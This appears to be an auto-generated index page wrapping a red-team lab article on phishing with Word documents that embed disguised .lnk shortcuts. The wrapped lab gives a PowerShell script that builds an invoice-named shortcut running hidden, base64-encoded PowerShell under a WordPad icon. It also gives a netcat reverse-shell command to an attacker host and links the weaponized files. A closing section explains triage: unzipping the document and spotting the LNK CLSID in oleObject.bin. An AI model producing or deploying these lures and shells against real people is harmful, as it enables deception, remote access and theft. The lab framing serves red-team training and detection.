---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Phishing: OLE + LNK

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-phishing-ole-lnk` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Phishing: OLE + LNK](../../topics/offensive-security/phishing-ole-lnk.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-phishing-with-ms-office-phishing-ole-lnk |
| name | Phishing: OLE + LNK |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk.md |

## Preserved Source Material

````yaml
_asset_filenames:
- lnk-clsid.png
- ole-ancestry1.png
- ole-ancestry2.png
- ole-change-icon.png
- ole-embedded-bin.png
- ole-execution.png
- ole-execution2.png
- ole-good-document.png
- ole-hexdump.png
- ole-insert-ole-object-with-icon.png
- ole-lnk-shortcut-created.png
- ole-payload.png
- ole-weaponized.png
_body: "---\ndescription: 'Phishing, Initial Access using embedded OLE + LNK objects'\n---\n\n# Phishing: OLE + LNK\n\nThis\
  \ lab explores a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them\
  \ with Ms Word office icons in order to deceive victims to click and run them. \n\n## Weaponization\n\nCreating an .LNK\
  \ file that will trigger the payload once executed:\n\n{% code title=\"attacker@local\" %}\n```csharp\n$command = 'Start-Process\
  \ c:\\shell.cmd'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\n\
  \n$obj = New-object -comobject wscript.shell\n$link = $obj.createshortcut(\"c:\\experiments\\ole+lnk\\Invoice-FinTech-0900541.lnk\"\
  )\n$link.windowstyle = \"7\"\n$link.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n$link.iconlocation\
  \ = \"C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe\"\n$link.arguments = \"-Nop -sta -noni -w hidden -encodedCommand\
  \ UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA==\"\n$link.save()\n```\n{% endcode %}\n\nPowershell\
  \ payload will trigger a rudimentary NC reverse shell:\n\n{% code title=\"c:\\\\shell.cmd\" %}\n```csharp\nC:\\tools\\nc.exe\
  \ 10.0.0.5 443 -e cmd.exe\n```\n{% endcode %}\n\nOnce the above powershell script is executed, an `.LNK` shortcut is created:\n\
  \n![](../../../.gitbook/assets/ole-lnk-shortcut-created.png)\n\nLet's create a Word document that will contain the malicious\
  \ shortcut that was created in the previous step:\n\n![](../../../.gitbook/assets/ole-good-document.png)\n\nLet's insert\
  \ a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:\n\n\
  ![](../../../.gitbook/assets/ole-insert-ole-object-with-icon.png)\n\n![](../../../.gitbook/assets/ole-change-icon.png)\n\
  \nPoint the package to the .lnk file containing the payload:\n\n![](../../../.gitbook/assets/ole-payload.png)\n\nFinal result:\n\
  \n![](../../../.gitbook/assets/ole-weaponized.png)\n\n## Execution\n\nVictim executing the embedded document. Gets presented\
  \ with a popup to confirm execution:\n\n![](../../../.gitbook/assets/ole-execution.png)\n\nOnce the victim confirms they\
  \ want to open the file - the reverse shell comes back to the attacker:\n\n![](../../../.gitbook/assets/ole-execution2.png)\n\
  \n{% file src=\"../../../.gitbook/assets/ole.ps1\" caption=\"OLE+LNK Powershell Script\" %}\n\n{% file src=\"../../../.gitbook/assets/invoice-fintech-0900541.lnk\"\
  \ caption=\"Invoice-FinTech-0900541.lnk\" %}\n\n{% file src=\"../../../.gitbook/assets/completely-not-a-scam-ole+lnk.docx\"\
  \ caption=\"Phishing: OLE+Lnk MS Word Doc Package\" %}\n\n## Observations\n\nAfter the payload is triggered, the process\
  \ ancestry looks as expected - powershell gets spawned by winword, cmd is spawned by powershell..:\n\n![](../../../.gitbook/assets/ole-ancestry1.png)\n\
  \nSoon after, the powershell gets killed and cmd.exe becomes an orphaned process:\n\n![](../../../.gitbook/assets/ole-ancestry2.png)\n\
  \nLike in [T1137: Phishing - Office Macros](t1137-office-vba-macros.md), you can use rudimentary tools on your Windows workstation\
  \ to quickly triage the suspicious Office document. First off, rename the file to a .zip extension and unzip it. Then you\
  \ can navigate to `word\\embeddings` and find `oleObject.bin` file that contains the malicious `.lnk`:\n\n![](../../../.gitbook/assets/ole-embedded-bin.png)\n\
  \nThen you can do a simple `strings` or hexdump against the file and you should immediately see signs of something that\
  \ should raise your eyebrow\\(s\\):\n\n```csharp\nhexdump.exe -C .\\oleObject1.bin\n```\n\n![](../../../.gitbook/assets/ole-hexdump.png)\n\
  \nAs an analyst, one should look for `CLSID 00021401-0000-0000-c000-000000000046` in the .bin file, which signifies that\
  \ the .doc contains an embnedded .lnk file. In our case this can be observed here:\n\n![](../../../.gitbook/assets/lnk-clsid.png)\n\
  \n## References\n\n{% embed url=\"https://msdn.microsoft.com/en-gb/library/dd891343.aspx\" %}\n\n{% embed url=\"https://adsecurity.org/wp-content/uploads/2016/09/DerbyCon6-2016-AttackingEvilCorp-Anatomy-of-a-Corporate-Hack-Presented.pdf\"\
  \ %}"
_relative_path: offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk.md
````
